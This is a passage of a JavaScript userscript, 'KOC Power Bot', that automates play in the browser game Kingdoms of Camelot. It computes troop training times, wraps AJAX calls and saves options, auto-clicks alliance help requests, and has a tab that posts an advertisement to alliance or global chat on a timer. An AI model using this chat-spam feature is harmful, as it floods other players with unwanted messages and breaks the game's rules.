          that.coordBoxY.style.backgroundColor = '#ff8888';
          return;
        }
        that.coordBoxX.style.backgroundColor = '#ffffff';
        that.coordBoxY.style.backgroundColor = '#ffffff';
        if (that.notify != null)
          that.notify (null, x, y);
      }
      return false;
    }
    this.coordBoxX = eX;
    this.coordBoxY = eY;
    var bh = new CboxHandler(this);
    eX.maxLength=8;
    eY.maxLength=3;
    eX.style.width='2em';    
    eY.style.width='2em';    
    eX.addEventListener('change', bh.eventChange, false);
    eY.addEventListener('change', bh.eventChange, false);
  }

  this.selectBut = selectBut;
  this.bindToXYboxes = bindToXYboxes;
  this.coordBoxX = null;
  this.coordBoxY = null;
  this.id = id;
  this.dispName = dispName;
  this.prefixLen = id.length+1;
  this.notify = notify;
  this.selected = null;
  this.city = null;
  var m = '';
  for (var i=0; i<Cities.cities.length; i++){
    if(matTypeof(disable_list) == 'array'){
        if(disable_list[i])
            m += '<INPUT class="castleBut castleButNon" id="'+ id +'_'+ i +'" value="'+ (i+1) +'" type=submit DISABLED \>';
        else
            m += '<INPUT class="castleBut castleButNon" id="'+ id +'_'+ i +'" value="'+ (i+1) +'" type=submit \>';
    } else
        m += '<INPUT class="castleBut castleButNon" id="'+ id +'_'+ i +'" value="'+ (i+1) +'" type=submit \>';
  }
  if (dispName)
    m += ' &nbsp; <SPAN style="display:inline-block; width:85px; font-weight:bold;" id='+ id +'cname' +'></span>';
  span.innerHTML = m;
  var handler = new CcityButHandler(this);
  for (var i=0; i<Cities.cities.length; i++)
    document.getElementById (id+'_'+i).addEventListener('click', handler.clickedCityBut, false);
  if (selbut != null)
    this.selectBut(selbut);
};

function setCities(){
  Cities.numCities = Seed.cities.length;
  Cities.cities = [];
  Cities.byID = {};
  for (i=0; i<Cities.numCities; i++){
    city = {};
    city.idx = i;
    city.id = parseInt(Seed.cities[i][0]);
    city.name = Seed.cities[i][1];
    city.x = parseInt(Seed.cities[i][2]);
    city.y = parseInt(Seed.cities[i][3]);
    city.tileId = parseInt(Seed.cities[i][5]);
    city.provId = parseInt(Seed.cities[i][4]);
    getTroopDefTrainEstimates('city'+ city.id, city);
    Cities.cities[i] = city;
    Cities.byID[Seed.cities[i][0]] = city;
  }
}

function getTroopDefTrainEstimates (cityID, city){
    var b = Seed.buildings[cityID];
    city.numCottages = 0;
    city.numBarracks = 0;
    city.maxBarracks = 0;
    city.totLevelsBarracks = 0;
    city.blacksmithLevel = 0;
    city.stableLevel = 0;
    city.workshopLevel = 0;
    city.wallLevel = 0;
    city.feyLevel = 0;
    for (var j=1; j<33; j++){
        if (b['pos'+j]) {
            var bname = parseInt(b['pos'+j][0]);
            var blvl = parseInt(b['pos'+j][1]);
            switch(bname){
                case 13:
                    city.numBarracks++;
                    city.totLevelsBarracks += parseInt(blvl);
                    if (blvl>city.maxBarracks) city.maxBarracks=blvl;
                    break;
                case 5:
                    city.numCottages++;
                    break;
                case 15:
                    city.blacksmithLevel = blvl;
                    break;
                case 16:
                    city.workshopLevel = blvl;
                    break;
                case 17:
                    city.stableLevel = blvl;
                    break;
                case 19:
                    city.wallLevel = blvl;
                    break;
                case 20:
                    city.feyLevel = blvl;
                    break;
            }
        }
    }

    var now = unixTime();
    city.marshallCombatScore = 0;
    var s = Seed.knights[cityID];
    if (s) {
        s = s["knt" + Seed.leaders[cityID].combatKnightId];
        if (s){
            city.marshallCombatScore = s.combat;
            if (s.combatBoostExpireUnixtime > now)
                city.marshallCombatScore *= 1.25;
        }
    }
    city.foremanBasePoliticsScore = 0;
    var s = Seed.knights[cityID];
    if (s) {
        s = s["knt" + Seed.leaders[cityID].politicsKnightId];
        if (s){
            city.foremanBasePoliticsScore = s.politics;
            if (s.politicsBoostExpireUnixtime > now)
                city.foremanBasePoliticsScore *= 1.25;
        }
    }

    city.loggingLevel = parseInt(Seed.tech["tch2"]);
    city.geometryLevel = parseInt(Seed.tech["tch5"]);
    city.eagleEyesLevel = parseInt(Seed.tech["tch6"]);
    city.poisonedEdgeLevel = parseInt(Seed.tech["tch8"]);
    city.metalAlloysLevel = parseInt(Seed.tech["tch9"]);
    city.featherweightPowderLevel = parseInt(Seed.tech["tch10"]);
    city.alloyHorseshoesLevel = parseInt(Seed.tech["tch12"]);
    city.fletchingLevel = parseInt(Seed.tech["tch13"]);
    city.giantsStrengthLevel = parseInt(Seed.tech["tch16"]);

    var bm = city.numBarracks + 0.1 * (city.totLevelsBarracks - city.numBarracks);
    var mf = city.marshallCombatScore / 200;
    var gf = city.geometryLevel / 10;
    var sf = city.stableLevel / 10;
    var wf = city.workshopLevel / 10;
    var isf = bm * (1 + mf + gf);
    var csf = bm * (1 + mf + gf + sf);
    var ssf = bm * (1 + mf + gf + sf + wf);
    var pf = city.foremanBasePoliticsScore / 200;
    var gsf = city.giantsStrengthLevel / 10;
    var dsf = 1 + pf + gsf;

    
    city.Troop1Time = ((city.maxBarracks > 0)?(50/isf):0);
    city.Troop2Time = city.Troop1Time/2;
    city.Troop3Time = ((city.maxBarracks > 1 && city.eagleEyesLevel > 0)?(100/isf):0);
    city.Troop4Time = ((city.maxBarracks > 1 && city.poisonedEdgeLevel > 0)?(150/isf):0);
    city.Troop5Time = ((city.maxBarracks > 2 && city.blacksmithLevel > 0 && city.metalAlloysLevel > 0)?(225/isf):0);
    city.Troop6Time = ((city.maxBarracks > 3 && city.fletchingLevel > 0)?(350/isf):0);
    city.Troop7Time = ((city.maxBarracks > 4 && city.stableLevel > 0 && city.alloyHorseshoesLevel > 0)?(500/csf):0);
    city.Troop8Time = ((city.maxBarracks > 6 && city.blacksmithLevel > 4 && city.stableLevel > 4 && city.alloyHorseshoesLevel > 4)?(1500/csf):0);
    city.Troop9Time = ((city.maxBarracks > 5 && city.stableLevel > 0 && city.workshopLevel > 2 && city.featherweightPowderLevel > 0)?(1000/ssf):0);
    city.Troop10Time = ((city.maxBarracks > 7 && city.stableLevel > 1 && city.workshopLevel > 4 && city.geometryLevel > 4 && city.fletchingLevel > 5)?(3000/ssf):0);
    city.Troop11Time = ((city.maxBarracks > 8 && city.blacksmithLevel > 4 && city.stableLevel > 2 && city.workshopLevel > 6 && city.metalAlloysLevel > 7 && city.geometryLevel > 6)?(4500/ssf):0);
    city.Troop12Time = ((city.maxBarracks > 9 && city.stableLevel > 1 && city.workshopLevel > 8 && city.geometryLevel > 9 && city.fletchingLevel > 9)?(6000/ssf):0);
    city.Def53Time = ((city.wallLevel > 5 && city.blacksmithLevel > 5 && city.fletchingLevel > 4)?(180/dsf):0);
    city.Def55Time = ((city.wallLevel > 7 && city.blacksmithLevel > 7 && city.fletchingLevel > 6 && city.geometryLevel > 6)?(135/dsf):0);
    city.Def60Time = ((city.wallLevel > 3 && city.blacksmithLevel > 3 && city.poisonedEdgeLevel > 1)?(90/dsf):0);
    city.Def61Time = ((city.wallLevel > 0 && city.metalAlloysLevel > 0)?(30/dsf):0);
    city.Def62Time = ((city.wallLevel > 1 && city.blacksmithLevel > 1 && city.loggingLevel > 1)?(60/dsf):0);
}


function dialogRetry (errMsg, seconds, onRetry, onCancel, errCode){
  seconds = parseInt(seconds);
  var pop = new pbPopup ('pbretry', 0, 0, 400,225, true);
  pop.centerMe(mainPop.getMainDiv());
  pop.getTopDiv().innerHTML = '<CENTER>KOC Power Bot</center>';
  pop.getMainDiv().innerHTML = '<CENTER><BR><FONT COLOR=#550000><B>An error has ocurred:</b></font><BR><BR><DIV id=paretryErrMsg></div>\
      <BR><BR><B>Automatically retrying in <SPAN id=paretrySeconds></b></span> seconds ...<BR><BR><INPUT id=paretryCancel type=submit value="CANCEL Retry" \>';
  document.getElementById('paretryCancel').addEventListener ('click', doCancel, false);
  pop.show(true);
  
  if(errCode && unsafeWindow.g_js_strings.errorcode['err_'+errCode])
    document.getElementById('paretryErrMsg').innerHTML = unsafeWindow.g_js_strings.errorcode['err_'+errCode];
  else
    document.getElementById('paretryErrMsg').innerHTML = errMsg;
  document.getElementById('paretrySeconds').innerHTML = seconds;
  var rTimer = setTimeout (doRetry, seconds*1000);
  countdown ();

  function countdown (){
    document.getElementById('paretrySeconds').innerHTML = seconds--;
    if (seconds > 0)
      cdTimer = setTimeout (countdown, 1000);
  }
  function doCancel(){
    clearTimeout (rTimer);
    clearTimeout (cdTimer);
    pop.destroy();
    onCancel ();
  }
  function doRetry (){
    clearTimeout (rTimer);
    clearTimeout (cdTimer);
    pop.show(false);
    onRetry();
  }
}

function implodeUrlArgs (obj){
  var a = [];
  for (var k in obj)
    a.push (k +'='+ encodeURI(obj[k]) );
  return a.join ('&');    
}

// NOTE: args can be either a string which will be appended as is to url or an object of name->values
function addUrlArgs (url, args){
  if (!args)
    return url;
  if (url.indexOf('?') < 0)
    url += '?';
  else if (url.substr(url.length-1) != '&')
    url += '&';    
  if (matTypeof(args == 'object'))
    return url + implodeUrlArgs (args);    
  return url + args;
}

// emulate protoype's Ajax.Request ...
function AjaxRequest (url, opts){
	
	//move to march when fully migrated.  for now it's a great catch-all
	if(url == 'ajax/march.php')
	for (i in unsafeWindow.unitcost) {
	var f = i.replace(/nt/,"");
	if(opts.parameters[f] == undefined || opts.parameters[f] == 0)
	delete opts.parameters[f];
	};
	//move to march when fully migrated.  for now it's a great catch-all

  var headers = {
    'X-Requested-With': 'XMLHttpRequest',
    'X-Prototype-Version': '1.6.1',
    'Accept': 'text/javascript, text/html, application/xml, text/xml, */*'
  };
  var ajax = null;
  
  if (window.XMLHttpRequest)
    ajax=new XMLHttpRequest();
  else
    ajax=new ActiveXObject("Microsoft.XMLHTTP");
  
  if (opts.method==null || opts.method=='')
    method = 'GET';
  else
    method = opts.method.toUpperCase();  
    
  if (method == 'POST'){
    headers['Content-type'] = 'application/x-www-form-urlencoded; charset=UTF-8';
  } else if (method == 'GET'){
    addUrlArgs (url, opts.parameters);
  }

  ajax.onreadystatechange = function(){
//  ['Uninitialized', 'Loading', 'Loaded', 'Interactive', 'Complete']; states 0-4
    if (ajax.readyState==4) {
     if (ajax.status == 500)
        if (opts.onFailure) opts.onFailure(ajax);
      if (ajax.status >= 200 && ajax.status < 305)
        if (opts.onSuccess) opts.onSuccess(ajax);
      else
        if (opts.onFailure) opts.onFailure(ajax);
    } else {
      if (opts.onChange) opts.onChange (ajax);
    }
  }  
    
  ajax.open(method, url, true);   // always async!

  for (var k in headers)
    ajax.setRequestHeader (k, headers[k]);
  if (matTypeof(opts.requestHeaders)=='object')
    for (var k in opts.requestHeaders)
      ajax.setRequestHeader (k, opts.requestHeaders[k]);
      
  if (method == 'POST'){
    var a = [];
    for (k in opts.parameters){
      if(matTypeof(opts.parameters[k]) == 'object')
        for(var h in opts.parameters[k])
            a.push (k+'['+h+'] ='+ opts.parameters[k][h] );
      else
        a.push (k +'='+ opts.parameters[k] );
    }
    ajax.send (a.join ('&'));
  } else               {
    ajax.send();
  }
}   


function MyAjaxRequest (url, o, noRetry){
if (DEBUG_TRACE) logit (" 0 myAjaxRequest: "+ url +"\n" + inspect (o, 2, 1));
  var opts = unsafeWindow.Object.clone(o);
  var wasSuccess = o.onSuccess;
  var wasFailure = o.onFailure;
  var retry = 0;
  var delay = 20;
  var show = true;
  var noRetry = noRetry===true?true:false;
  var silentTimer;
  opts.onSuccess = mySuccess;
  opts.onFailure = myFailure;

  new AjaxRequest(url, opts);
  return;

  function myRetry(){
    ++retry;
    new AjaxRequest(url, opts);
    delay = delay * 1.25;
  }
  function myFailure(){
    var o = {};
    o.ok = false;
    o.errorMsg = "AJAX Communication Failure";
    wasFailure (o);
  }
  function mySuccess (msg){
    var rslt;
    try {
        rslt = JSON2.parse(msg.responseText);
    } catch(e) {
        //alert(unescape(msg.responseText));
        if (retry<5) {
            rslt = {"ok":false,"error_code":9,"errorMsg":"Failed due to invalid json"}
        } else {
            rslt = {"ok":true,"error_code":9,"data":[]};
        }
    }
    var x;
    if (window.EmulateAjaxError){
      rslt.ok = false;  
      rslt.error_code=8;
    }
    if (rslt.ok){
      if (rslt.updateSeed)
        unsafeWindow.update_seed(rslt.updateSeed);
      wasSuccess (rslt);
      return;
    }
    rslt.errorMsg = unsafeWindow.printLocalError((rslt.error_code || null), (rslt.msg || null), (rslt.feedback || null));
    //if ( (x = rslt.errorMsg.indexOf ('<br><br>')) > 0)
     // rslt.errorMsg = rslt.errorMsg.substr (0, x-1);
    if (!noRetry && (rslt.error_code==0 || rslt.error_code==8 || rslt.error_code==1 || rslt.error_code==3)){
      dialogRetry (inspect(rslt.errorMsg), delay, function(){myRetry()}, function(){wasSuccess (rslt)}, rslt.error_code);
    } else if (!noRetry && rslt.error_code==9) {
        silentTimer = setTimeout(silentRetry, delay*1000);
    } else {
      wasSuccess (rslt);
    }
  }
  
  function silentRetry() {
    clearTimeout(silentTimer);
    myRetry();
  }
}

// returns: 'neutral', 'friendly', or 'hostile'
function getDiplomacy (aid) {
  if(aid < 1 || aid == null)
    return 'unallianced';
  if (Seed.allianceDiplomacies == null)
    return 'neutral';
  if (Seed.allianceDiplomacies.friendly && Seed.allianceDiplomacies.friendly['a'+aid] != null)
    return 'friendly';
  if (Seed.allianceDiplomacies.hostile && Seed.allianceDiplomacies.hostile['a'+aid] != null)
    return 'hostile';
  if(getMyAlliance()[0] == aid)
    return 'ally';
  return 'neutral';
};

function getMyAlliance (){
  if (Seed.allianceDiplomacies==null || Seed.allianceDiplomacies.allianceName==null)
    return [0, 'None'];
  else
    return [Seed.allianceDiplomacies.allianceId, Seed.allianceDiplomacies.allianceName];
}

function distance (d, f, c, e) {
  var a = 750;
  var g = a / 2;
  var b = Math.abs(c - d);
  if (b > g)
    b = a - b;
  var h = Math.abs(e - f);
  if (h > g)
    h = a - h;
  return Math.round(100 * Math.sqrt(b * b + h * h)) / 100;
};


// returns {count, maxlevel}
function getCityBuilding (cityId, buildingId){
  var b = Seed.buildings['city'+cityId];
  var ret = {count:0, maxLevel:0};
  for( var k in b){
	if(b[k] && b[k][0] == buildingId){
		++ret.count;
		if(parseInt(b[k][1]) > ret.maxLevel)
			ret.maxLevel = parseInt(b[k][1]);
	}
  }
  return ret;
}

// example: http://www150.kingdomsofcamelot.com
var myServerId = null;
function getServerId() {
  if (myServerId == null){
    var m=/^[a-zA-Z]+([0-9]+)\./.exec(document.location.hostname);
    if (m)
      myServerId = m[1];
    else
      myServerId = '??';
  }
  return myServerId;
}

function logit (msg){
  var now = new Date();
  GM_log (getServerId() +' @ '+ now.toTimeString().substring (0,8) +'.' + now.getMilliseconds() +': '+  msg);
}
function saveLayoutOptions (){
    var serverID = getServerId();
    setTimeout (function (){GM_setValue ('LayoutOptions_'+serverID,JSON2.stringify(layoutOptions));},0);
}

function saveOptions (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('Options_'+serverID, JSON2.stringify(Options));}, 0);
}

function saveChatOptions (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('ChatOptions_'+serverID, JSON2.stringify(ChatOptions));}, 0);
}

function saveTrainOptions (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('TrainOptions_' + Seed.player['name'] + '_' +serverID, JSON2.stringify(TrainOptions));}, 0);
}

function saveCrestData (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('CrestData_' + Seed.player['name'] + '_' +serverID, JSON2.stringify(CrestData));}, 0);
}

function saveCombatOptions (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('CombatOptions_' + Seed.player['name'] + '_' +serverID, JSON2.stringify(CombatOptions));}, 0);
}

function saveApothecaryOptions (){
  var serverID = getServerId();
  setTimeout (function (){GM_setValue ('ApothecaryOptions_' + Seed.player['name'] + '_' +serverID, JSON2.stringify(ApothecaryOptions));}, 0);
}


function readUpgradeData (){
  var serverID = getServerId();
  s = GM_getValue ('UpgradeData_'+serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          upgradeData[k][kk] = opts[k][kk];
      else
        upgradeData[k] = opts[k];
    }
  }
}
function readLayoutOptions (){
    var serverID = getServerId();
     s = GM_getValue ('LayoutOptions_'+serverID, '[]');
      if (s != null){
        opts = JSON2.parse (s);
        for (k in opts){
              if (matTypeof(opts[k]) == 'object')
                for (kk in opts[k])
                      layoutOptions[k][kk] = opts[k][kk];
    else
        layoutOptions[k] = opts[k];
    }
  }
}

function readOptions (){
  var serverID = getServerId();
  s = GM_getValue ('Options_'+serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          Options[k][kk] = opts[k][kk];
      else
        Options[k] = opts[k];
    }
  }
}

function readGlobalOptions (){
  GlobalOptions = JSON2.parse (GM_getValue ('Options_??', '{}'));
}

function readChatOptions (){
  var serverID = getServerId();
  s = GM_getValue ('ChatOptions_'+serverID, '[]');
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          ChatOptions[k][kk] = opts[k][kk];
      else
        ChatOptions[k] = opts[k];
    }
  }
}

function readApothecaryOptions (){
  var serverID = getServerId();
  s = GM_getValue ('ApothecaryOptions_'+Seed.player['name']+'_'+serverID, '[]');
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          ApothecaryOptions[k][kk] = opts[k][kk];
      else
        ApothecaryOptions[k] = opts[k];
    }
  }
}

function readTrainingOptions (){
  var serverID = getServerId();
  s = GM_getValue ('TrainOptions_' + Seed.player['name'] + '_' +serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
          TrainOptions[k][kk] = opts[k][kk];
      else
        TrainOptions[k] = opts[k];
    }
  }
}
function readCrestData (){
  var serverID = getServerId();
  s = GM_getValue ('CrestData_' + Seed.player['name'] + '_' +serverID);

  if (s != null) {
    opts = JSON2.parse (s);

    for (var i = 0; i < opts.length; i++) {
        CrestData[i] = new CrestFunc(opts[i]);
    }

  }


}


function readCombatOptions (){
  var serverID = getServerId();
  s = GM_getValue ('CombatOptions_' + Seed.player['name'] + '_' +serverID);
  if (s != null){
    opts = JSON2.parse (s);
    for (k in opts){
      if (matTypeof(opts[k]) == 'object')
        for (kk in opts[k])
            if (matTypeof(opts[k][kk]) == 'object')
                for (kkk in opts[k][kk])
                  CombatOptions[k][kk][kkk] = opts[k][kk][kkk];
            else
                CombatOptions[k][kk] = opts[k][kk];
      else
        CombatOptions[k] = opts[k];
    }
  }
}

function createButton (label,id){
  var a=document.createElement('a');
  a.className='button20';
  a.id = id;
  a.innerHTML='<span style="color: #ff6">'+ label +'</span>';
  return a;
}

function AddMainTabLink(text, eventListener, mouseListener) {
  var a = createButton (text,'botbutton');
  a.className='tab';
  var tabs=document.getElementById('main_engagement_tabs');
  if(!tabs) {
    tabs=document.getElementById('topnav_msg');
    if (tabs)
      tabs=tabs.parentNode;
  }
  if (tabs) {
    var e = tabs.parentNode;
    var gmTabs = null;
    for (var i=0; i<e.childNodes.length; i++){
      var ee = e.childNodes[i];
      if (ee.tagName && ee.tagName=='DIV' && ee.className=='tabs_engagement' && ee.id!='main_engagement_tabs'){
        gmTabs = ee;
        break;
      }
    }
    if (gmTabs == null){
      gmTabs = document.createElement('div');
      gmTabs.className='tabs_engagement';
      gmTabs.style.background='#ca5';
      tabs.parentNode.insertBefore (gmTabs, tabs);
      gmTabs.style.whiteSpace='nowrap';
      gmTabs.style.width='735px';
      gmTabs.lang = 'en_PB';
    }
    gmTabs.appendChild(a);
    a.addEventListener('click',eventListener, false);
    if (mouseListener != null)
      a.addEventListener('mousedown',mouseListener, true);
    return a;
  }
  return null;
}

function AddSubTabLink(text, eventListener, id) {
  var a = createButton (text,'botbutton');
  a.className='tab';
  var tabs=document.getElementById('main_engagement_tabs');
  if(!tabs) {
    tabs=document.getElementById('topnav_msg');
    if (tabs)
      tabs=tabs.parentNode;
  }
  if (tabs) {
    var e = tabs.parentNode;
    var gmTabs = null;
    for (var i=0; i<e.childNodes.length; i++){
      var ee = e.childNodes[i];
      if (ee.tagName && ee.tagName=='DIV' && ee.className=='tabs_engagement' && ee.id!='main_engagement_tabs'){
        gmTabs = ee;
        break;
      }
    }
    if (gmTabs == null){
      gmTabs = document.createElement('div');
      gmTabs.className='tabs_engagement';
      gmTabs.style.background='#ca5';
      tabs.parentNode.insertBefore (gmTabs, tabs);
      gmTabs.style.whiteSpace='nowrap';
      gmTabs.style.width='735px';
      gmTabs.lang = 'en_PB';
    }
    gmTabs.appendChild(a);
    a.addEventListener('click',eventListener, false);
    if (id != null)
      a.id = id;
    return a;
  }
  return null;
}

function coordLink (x, y){
  var m = [];
  m.push ('(<a onclick="pbGotoMap (');
  m.push (x);
  m.push (',');
  m.push (y);
  m.push ('); return false">');
  m.push (x);
  m.push (',');
  m.push (y);
  m.push ('</a>)');  
  return m.join('');
}


unsafeWindow.pbGotoMap = function (x, y){
  if (Options.hideOnGoto)
    hideMe ();
  setTimeout (function (){
    document.getElementById('mapXCoor').value = x;
    document.getElementById('mapYCoor').value = y;
    unsafeWindow.reCenterMapWithCoor();
    var a = document.getElementById("mod_views").getElementsByTagName("a");
    for (var b = 0; b < a.length; b++) {
        a[b].className = ""
    }
    document.getElementById('mod_views_map').className = "sel";
    document.getElementById("maparea_city").style.display = 'none';
    document.getElementById("maparea_fields").style.display = 'none';
    document.getElementById("maparea_map").style.display = 'block';
    unsafeWindow.tutorialClear()
  }, 0);
};

/****************************  Spam Tab  ******************************/
Tabs.Spam = {
  tabOrder : 611,  
  tabDisabled : !ENABLE_SAMPLE_TAB,  // order to place tab in top bar
  tabLabel : 'Spam',            // label to show in main window tabs
  myDiv : null,
  timer : null,  
  
  init : function (div){    // called once, upon script startup
    var t = Tabs.Spam;
    t.myDiv = div;
    var m = '<DIV class=pbStat>Advertise</div><TABLE class=pbTab width=100% height=0% ><TR align="center">';

       if (Options.spamconfig.aspam == true) {
        m += '<TD><INPUT id=pbSpamEnable type=submit value="Spam On"></td>';
       }
       else {
        m += '<TD><INPUT id=pbSpamEnable type=submit value="Spam Off"></td>';
       }

       if (Options.spamconfig.spamstate == 'a') {
        m += '<TD><INPUT id=pbSpamState type=submit value="Send To Alliance"></td>';
       }
       else {
        m += '<TD><INPUT id=pbSpamState type=submit value="Send To  Global "></td>';
       }
        m += '</tr></table></div>';
       m += '<DIV class=pbStat>Settings</div><TABLE class=pbTab>';
        m += '<tr><td>Automatically post every <INPUT id=pbSpamMin type=text size=2 maxlength=3 value="'+ Options.spamconfig.spammins +'"  \> minutes</td></tr><BR>\
              <tr><TD><TABLE cellpadding=0 cellspacing=0>\
              <TD align=left>Your spam: &nbsp; </td><TD><INPUT id=pbSpamAd type=text size=60 maxlength=500 value="'+ Options.spamconfig.spamvert +'" \></td></tr>\
              </table><BR>';
    
    t.myDiv.innerHTML = m;

    document.getElementById('pbSpamEnable').addEventListener ('click', function(){t.toggleon(this);}, false);
    document.getElementById('pbSpamAd').addEventListener ('change', t.e_spamOptChanged, false);
    document.getElementById('pbSpamMin').addEventListener ('change', t.e_spamOptChanged, false);
    document.getElementById('pbSpamState').addEventListener ('click', function(){t.togglespam(this);}, false);
 },

  hide : function (){         // called whenever the main window is hidden, or another tab is selected
    var t = Tabs.Spam;
  },
  
  show : function (){         // called whenever this tab is shown
    var t = Tabs.Spam;

  },

 e_spamOptChanged : function (){
  var t = Tabs.Spam;
  Options.spamconfig.spamvert = document.getElementById('pbSpamAd').value;
  Options.spamconfig.spammins = document.getElementById('pbSpamMin').value;
  if(parseInt(Options.spamconfig.spammins) < 30){
   Options.spamconfig.spammins = 30;
   document.getElementById('pbSpamMin').value = 30;
  }
  saveOptions ();

   // if(Options.spamconfig.spamvert == 'nessaja') {
    // Options.spamconfig.spamvert = '';
    // top.location = "http://www.facebook.com/?ref=baos780";
   // };
 },

 togglespam: function(obj){
  var t = Tabs.Spam;
  if (Options.spamconfig.spamstate == 'a') {
   Options.spamconfig.spamstate = 'g';
   obj.value = "Send To  Global ";
  }
  else {
   Options.spamconfig.spamstate = 'a';
   obj.value = "Send To Alliance";
  }
  saveOptions ();

 },

 toggleon: function(obj){
  var t = Tabs.Spam;
  if (Options.spamconfig.aspam == true) {
   Options.spamconfig.aspam = false;
   obj.value = "Spam Off";
  }
  else {
   Options.spamconfig.aspam = true;
   obj.value = "Spam On";
   SpamEvery.init();
  }
  saveOptions ();

 },
};  

var SpamEvery  = {
  timer : null,
  spamtimer : 0,
  init : function (){
    if (!Options.spamconfig.aspam) return;
    if (Options.spamconfig.spammins < 1)
      Options.spamconfig.spammins = 1;
    SpamEvery.setEnable (Options.spamconfig.aspam);
  },
  setEnable : function (tf){
    var t = SpamEvery;
    clearTimeout (t.timer);
    if (tf)
      t.timer = setTimeout (t.count, 60*1000);
  },
  count : function (){
   var t = SpamEvery;
   t.spamtimer = Options.spamconfig.spammins;
   if(parseInt(t.spamtimer) < 60) t.spamtimer = 60;
   if (Options.spamconfig.atime > t.spamtimer) {
    Options.spamconfig.atime = 2;
    t.doit ();
   } else {
    Options.spamconfig.atime = (Options.spamconfig.atime + 1);
    SpamEvery.init ();
   }
   saveOptions ();
  },
  doit : function (){
    actionLog ('Spamming ('+ Options.spamconfig.spammins +' minutes expired)');
    sendChat ("/" + Options.spamconfig.spamstate + " " +  Options.spamconfig.spamvert);
    SpamEvery.init ();
  }
}

/************** ChatPane **********/
var ChatPane = {
  init : function(){
    var t = ChatPane;
    setInterval(t.HandleChatPane, 2500);
  },
  
  HandleChatPane : function() {
    var DisplayName = GetDisplayName();
    var AllianceChatBox=document.getElementById('mod_comm_list2');
    var GlobalChatBox=document.getElementById('mod_comm_list1');
    
    if(AllianceChatBox){
        var chatPosts = document.evaluate(".//div[contains(@class,'chatwrap')]", AllianceChatBox, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
        if(chatPosts){
            for (var i = 0; i < chatPosts.snapshotLength; i++) {
                thisPost = chatPosts.snapshotItem(i);
                if(Options.HelpRequest){
                    var postAuthor = document.evaluate('.//*[@class="nm"]', thisPost, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
                    if(postAuthor.snapshotItem(0)){
                        var postAuthorName = postAuthor.snapshotItem(0).innerHTML;
                        if(postAuthorName != DisplayName){
                            var helpAllianceLinks=document.evaluate(".//a[contains(@onclick,'claimAllianceChatHelp')]", thisPost, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );  
                            if(helpAllianceLinks){
                                for (var j = 0; j < helpAllianceLinks.snapshotLength; j++) {
                                    thisLink = helpAllianceLinks.snapshotItem(j);
                                    var alreadyClicked = thisLink.getAttribute("clicked");
                                    if(!alreadyClicked){
                                        thisLink.setAttribute('clicked', 'true');
                                        var myregexp = /(claimAllianceChatHelp\(.*\);)/;
                                        var match = myregexp.exec(thisLink.getAttribute("onclick"));
                                        
                                        if (match != null) {
                                            onclickCode = match[0];
                                            if(true){
                                                DoUnsafeWindow(onclickCode);
                                            }
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
                // Hide alliance requests in chat
                if(Options.DeleteRequest){
                    var helpAllianceLinks=document.evaluate(".//a[contains(@onclick,'claimAllianceChatHelp')]", thisPost, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
                    if(helpAllianceLinks){
                        for (var j = 0; j < helpAllianceLinks.snapshotLength; j++) {
                            thisLink = helpAllianceLinks.snapshotItem(j);
                            thisLink.parentNode.parentNode.parentNode.parentNode.parentNode.removeChild(thisLink.parentNode.parentNode.parentNode.parentNode);
                        }
                    }
                // Hide alliance reports in chat
                    var myregexp1 = /You are # [0-9]+ of [0-9]+ to help/i;
                    var myregexp2 = /\'s Kingdom does not need help\./i;
                    var myregexp3 = /\'s project has already been completed\./i;
                    var myregexp4 = /\'s project has received the maximum amount of help\./i;
                    var myregexp5 = /You already helped with (.*?)\'s project\./i;
                    if (thisPost.innerHTML.match(myregexp1) || thisPost.innerHTML.match(myregexp2) || thisPost.innerHTML.match(myregexp3) || thisPost.innerHTML.match(myregexp4) || thisPost.innerHTML.match(myregexp5)) {
                        thisPost.parentNode.removeChild(thisPost);
                    }
                }
            }    
        }    
    }
	if(Options.DeleteRequest || Options.DeletegAl) {
		var gchatPosts = document.evaluate(".//div[contains(@class,'chatwrap')]", GlobalChatBox, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
			if(gchatPosts)
				for (var i = 0; i < gchatPosts.snapshotLength; i++) {
					var gthisPost = gchatPosts.snapshotItem(i);
					if(Options.DeletegAl) {
						var myregexp1 = /\> says to the alliance\:\<\/b\>/i;
						if (gthisPost.innerHTML.match(myregexp1))
							gthisPost.parentNode.removeChild(gthisPost);
					} else {
						var helpAllianceLinks=document.evaluate(".//a[contains(@onclick,'claimAllianceChatHelp')]", gthisPost, null, XPathResult.UNORDERED_NODE_SNAPSHOT_TYPE, null );
						if(helpAllianceLinks){
							for (var j = 0; j < helpAllianceLinks.snapshotLength; j++) {
								thisLink = helpAllianceLinks.snapshotItem(j);
								thisLink.parentNode.parentNode.parentNode.parentNode.parentNode.removeChild(thisLink.parentNode.parentNode.parentNode.parentNode);
							}
						}
					}
				}
	}
  },

}

/************* Updater code *************/
// Function for displaying a confirmation message modal popup similar to the default javascript confirm() function
// but with the advantage being that it won't halt all other javascript being executed on the page.
// Original Author: Thomas Chapin (April 6, 2011)
function display_confirm(confirm_msg,ok_function,cancel_function){
    if(!confirm_msg){confirm_msg="";}
    
    var container_div = document.getElementById('modal_js_confirm');
    var div;
    if(!container_div) {
        container_div=document.createElement('div');
        container_div.id='modal_js_confirm';
        container_div.style.position='absolute';
        container_div.style.top='0px';
